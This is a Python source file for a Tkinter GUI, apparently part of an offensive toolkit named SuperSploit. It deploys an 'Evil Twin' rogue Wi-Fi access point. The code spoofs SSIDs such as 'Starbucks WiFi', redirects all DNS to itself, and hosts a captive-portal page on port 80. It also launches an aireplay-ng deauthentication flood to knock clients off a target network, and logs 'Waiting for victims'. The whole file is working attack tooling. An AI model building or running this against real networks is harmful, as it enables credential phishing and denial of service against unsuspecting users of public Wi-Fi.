import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import threading
import subprocess
import os
import time
import http.server
import socketserver
import sys

try:
    from source.core.license_manager import LicenseManager
except ImportError:
    framework_root = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "..", ".."))
    if framework_root not in sys.path:
        sys.path.append(framework_root)
    try:
        from source.core.license_manager import LicenseManager
    except ImportError:
        class LicenseManager:
            @staticmethod
            def gate_access(f):
                print(f"\n[!] ACCESS DENIED: '{f}' is a SuperSploit Pro feature.")
                print("[*] Standalone license validation failed. Please run via the main CLI.")
                return False

class EvilTwinGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("SuperSploit Evil Twin - ROGUE AP DEPLOYMENT")
        self.root.geometry("700x600")
        
        self.style = ttk.Style()
        self.style.theme_use('clam')
        self.is_running = False
        self.procs = []
        self.httpd = None
        self.deauth_proc = None
        self.deauth_running = False
        
        self.config = {
            "iface": "wlan1",
            "ssid": "Free Public WiFi",
            "channel": "6",
            "bssid": "",
            "security": "Open",
            "passphrase": "password123",
            "portal": "default",
            "auto_host": True
        }
        
        self._build_ui()

    def _build_ui(self):
        main_frame = ttk.Frame(self.root, padding="15")
        main_frame.pack(fill=tk.BOTH, expand=True)

        # Top Control Panel
        top_frame = ttk.Frame(main_frame)
        top_frame.pack(fill=tk.X, pady=5)
        
        self.settings_btn = ttk.Button(top_frame, text="⚙️ AP Settings", command=self._open_settings)
        self.settings_btn.pack(side=tk.LEFT, padx=5)
        
        self.start_btn = ttk.Button(top_frame, text="🟢 START EVIL TWIN", command=self._start_ap)
        self.start_btn.pack(side=tk.LEFT, padx=5)
        
        self.stop_btn = ttk.Button(top_frame, text="🔴 STOP EVIL TWIN", command=self._stop_ap, state=tk.DISABLED)
        self.stop_btn.pack(side=tk.LEFT, padx=5)
        
        # Deauth Engine Config
        deauth_frame = ttk.LabelFrame(main_frame, text=" ⚔️ Deauth Engine Configuration ", padding="10")
        deauth_frame.pack(fill=tk.X, pady=10)
        
        ttk.Label(deauth_frame, text="Target BSSID:").grid(row=0, column=0, sticky=tk.W)
        self.deauth_bssid = ttk.Entry(deauth_frame, width=20)
        self.deauth_bssid.grid(row=0, column=1, padx=5, pady=2)
        
        ttk.Label(deauth_frame, text="Client (Blank=Broadcast):").grid(row=0, column=2, sticky=tk.W)
        self.deauth_client = ttk.Entry(deauth_frame, width=20)
        self.deauth_client.grid(row=0, column=3, padx=5, pady=2)
        
        self.deauth_btn = ttk.Button(deauth_frame, text="⚡ LAUNCH DEAUTH", command=self._toggle_deauth)
        self.deauth_btn.grid(row=1, column=0, columnspan=4, pady=5)

        # Console
        log_frame = ttk.LabelFrame(main_frame, text=" 🖥️ AP Telemetry Console ", padding="5")
        log_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        self.console = scrolledtext.ScrolledText(log_frame, bg="black", fg="#00FF00", font=("Courier", 9))
        self.console.pack(fill=tk.BOTH, expand=True)

    def log(self, msg):
        def _update():
            self.console.insert(tk.END, f"[{time.strftime('%H:%M:%S')}] {msg}\n")
            self.console.see(tk.END)
        self.root.after(0, _update)

    def _get_wireless_interfaces(self):
        try:
            return [i for i in os.listdir('/sys/class/net') if 'wl' in i or 'wlan' in i]
        except:
            return ["wlan0", "wlan1"]
            
    def _get_portal_templates(self):
        portal_base = os.path.join(os.getenv("HOME"), ".SuperSploit", ".data", "captive_portal")
        os.makedirs(portal_base, exist_ok=True)
        templates = [d for d in os.listdir(portal_base) if os.path.isdir(os.path.join(portal_base, d))]
        return templates if templates else ["default"]

    def _open_settings(self):
        win = tk.Toplevel(self.root)
        win.title("Advanced AP Configuration")
        win.geometry("450x350")
        win.transient(self.root)
        win.grab_set()
        
        frame = ttk.Frame(win, padding="15")
        frame.pack(fill=tk.BOTH, expand=True)
        
        ttk.Label(frame, text="Interface:").grid(row=0, column=0, sticky=tk.W, pady=5)
        iface_cb = ttk.Combobox(frame, values=self._get_wireless_interfaces(), width=20)
        iface_cb.set(self.config["iface"])
        iface_cb.grid(row=0, column=1, sticky=tk.W, pady=5)
        
        ttk.Label(frame, text="Rogue SSID:").grid(row=1, column=0, sticky=tk.W, pady=5)
        ssid_cb = ttk.Combobox(frame, values=["Free Public WiFi", "Starbucks WiFi", "Airport Free", "Xfinitywifi"], width=20)
        ssid_cb.set(self.config["ssid"])
        ssid_cb.grid(row=1, column=1, sticky=tk.W, pady=5)
        
        ttk.Label(frame, text="Channel:").grid(row=2, column=0, sticky=tk.W, pady=5)
        chan_cb = ttk.Combobox(frame, values=[str(i) for i in range(1, 14)], width=20)
        chan_cb.set(self.config["channel"])
        chan_cb.grid(row=2, column=1, sticky=tk.W, pady=5)
        
        ttk.Label(frame, text="Spoof BSSID:").grid(row=3, column=0, sticky=tk.W, pady=5)
        bssid_ent = ttk.Entry(frame, width=23)
        bssid_ent.insert(0, self.config["bssid"])
        bssid_ent.grid(row=3, column=1, sticky=tk.W, pady=5)
        
        ttk.Label(frame, text="Security:").grid(row=4, column=0, sticky=tk.W, pady=5)
        sec_cb = ttk.Combobox(frame, values=["Open", "WPA2"], state="readonly", width=20)
        sec_cb.set(self.config["security"])
        sec_cb.grid(row=4, column=1, sticky=tk.W, pady=5)
        
        ttk.Label(frame, text="Passphrase (WPA2):").grid(row=5, column=0, sticky=tk.W, pady=5)
        pass_ent = ttk.Entry(frame, width=23)
        pass_ent.insert(0, self.config["passphrase"])
        pass_ent.grid(row=5, column=1, sticky=tk.W, pady=5)
        
        ttk.Label(frame, text="Portal Template:").grid(row=6, column=0, sticky=tk.W, pady=5)
        portal_cb = ttk.Combobox(frame, values=self._get_portal_templates(), width=20)
        portal_cb.set(self.config["portal"])
        portal_cb.grid(row=6, column=1, sticky=tk.W, pady=5)
        
        host_var = tk.BooleanVar(value=self.config["auto_host"])
        ttk.Checkbutton(frame, text="Auto-Host Portal on Port 80", variable=host_var).grid(row=7, column=0, columnspan=2, sticky=tk.W, pady=5)
        
        def save_config():
            self.config["iface"] = iface_cb.get()
            self.config["ssid"] = ssid_cb.get()
            self.config["channel"] = chan_cb.get()
            self.config["bssid"] = bssid_ent.get()
            self.config["security"] = sec_cb.get()
            self.config["passphrase"] = pass_ent.get()
            self.config["portal"] = portal_cb.get()
            self.config["auto_host"] = host_var.get()
            self.log("[*] AP Configuration securely saved in memory.")
            win.destroy()
            
        ttk.Button(frame, text="💾 Save Settings", command=save_config).grid(row=8, column=0, columnspan=2, pady=10)

    def _start_ap(self):
        self.start_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.NORMAL)
        self.settings_btn.config(state=tk.DISABLED)
        self.is_running = True
        threading.Thread(target=self._run_daemons, daemon=True).start()

    def _stop_ap(self):
        self.is_running = False
        self.log("[*] Tearing down Rogue AP...")
        
        if self.httpd:
            self.httpd.shutdown()
            self.log("[*] Internal Captive Portal Web Server stopped.")
            
        if self.deauth_running:
            self._toggle_deauth()
            
        subprocess.run(["sudo", "killall", "dnsmasq", "hostapd"], stderr=subprocess.DEVNULL)
        subprocess.run(["sudo", "ifconfig", self.config["iface"], "down"])
        self.start_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)
        self.settings_btn.config(state=tk.NORMAL)
        self.log("[+] Interface downed. AP Terminated.")

    def _run_daemons(self):
        ifc = self.config["iface"]
        ssid_name = self.config["ssid"]
        channel_val = self.config["channel"]
        bssid_val = self.config["bssid"]
        
        portal_dir = os.path.join(os.getenv("HOME"), ".SuperSploit", ".data", "captive_portal")
        os.makedirs(portal_dir, exist_ok=True)
        h_conf = os.path.join(portal_dir, "hostapd.conf")
        d_conf = os.path.join(portal_dir, "dnsmasq.conf")

        hostapd_conf = f"interface={ifc}\ndriver=nl80211\nssid={ssid_name}\nhw_mode=g\nchannel={channel_val}\n"
        if bssid_val:
            hostapd_conf += f"bssid={bssid_val}\n"
        if self.config["security"] == "WPA2":
            hostapd_conf += f"wpa=2\nwpa_passphrase={self.config['passphrase']}\nwpa_key_mgmt=WPA-PSK\nrsn_pairwise=CCMP\n"
            
        with open(h_conf, "w") as f:
            f.write(hostapd_conf)
        with open(d_conf, "w") as f:
            f.write(f"interface={ifc}\ndhcp-range=192.168.99.10,192.168.99.250,12h\ndhcp-option=3,192.168.99.1\naddress=/#/192.168.99.1\n")

        self.log(f"[*] Configuring {ifc} for 192.168.99.1...")
        subprocess.run(["sudo", "ifconfig", ifc, "up", "192.168.99.1", "netmask", "255.255.255.0"])
        subprocess.run(["sudo", "killall", "dnsmasq", "hostapd", "wpa_supplicant"], stderr=subprocess.DEVNULL)
        
        self.log("[*] Launching dnsmasq & hostapd...")
        d_proc = subprocess.Popen(["sudo", "dnsmasq", "-C", d_conf, "-d"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        h_proc = subprocess.Popen(["sudo", "hostapd", h_conf], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        
        self.procs = [d_proc, h_proc]
        self.log(f"[+] Rogue AP '{ssid_name}' is LIVE! Waiting for victims...")
        
        if self.config["auto_host"]:
            template_dir = os.path.join(portal_dir, self.config["portal"])
            os.makedirs(template_dir, exist_ok=True)
            threading.Thread(target=self._start_http_server, args=(template_dir,), daemon=True).start()
        else:
            self.log("[!] Auto-Host disabled. Ensure your external web server is running on port 80.")

        def read_output(proc, prefix):
            for line in iter(proc.stdout.readline, ''):
                if not self.is_running: break
                if line.strip(): self.log(f"[{prefix}] {line.strip()}")

        threading.Thread(target=read_output, args=(d_proc, "DHCP/DNS"), daemon=True).start()
        threading.Thread(target=read_output, args=(h_proc, "WIFI"), daemon=True).start()
        
        d_proc.wait()
        h_proc.wait()
        
    def _toggle_deauth(self):
        if self.deauth_running:
            self.deauth_running = False
            self.deauth_btn.config(text="⚡ LAUNCH DEAUTH")
            if self.deauth_proc:
                subprocess.run(["sudo", "kill", "-9", str(self.deauth_proc.pid)], stderr=subprocess.DEVNULL)
            self.log("[*] Deauth Engine stopped.")
        else:
            bssid = self.deauth_bssid.get().strip()
            client = self.deauth_client.get().strip()
            iface = self.config["iface"]
            
            if not bssid:
                self.log("[-] Error: Target BSSID is required for Deauth.")
                return
                
            self.deauth_running = True
            self.deauth_btn.config(text="🛑 STOP DEAUTH")
            self.log(f"[*] Launching Deauth against {bssid} on {iface}...")
            
            def deauth_runner():
                cmd = ["sudo", "aireplay-ng", "-0", "0", "-a", bssid]
                if client: cmd.extend(["-c", client])
                cmd.append(iface)
                self.deauth_proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
                
            threading.Thread(target=deauth_runner, daemon=True).start()
        
    def _start_http_server(self, portal_dir):
        try:
            class CaptivePortalHandler(http.server.SimpleHTTPRequestHandler):
                def __init__(self, *args, **kwargs):
                    super().__init__(*args, directory=portal_dir, **kwargs)
            
            socketserver.TCPServer.allow_reuse_address = True
            self.httpd = socketserver.TCPServer(("", 80), CaptivePortalHandler)
            self.log(f"[+] Captive Portal HTTP Server active on 0.0.0.0:80 serving '{portal_dir}'.")
            self.httpd.serve_forever()
        except Exception as e:
            self.log(f"[-] Failed to start HTTP Server (Is port 80 in use?): {e}")

if __name__ == "__main__":
    if not LicenseManager.gate_access("Evil Twin / Rogue AP"):
        sys.exit(1)
    root = tk.Tk()
    app = EvilTwinGUI(root)
    root.mainloop()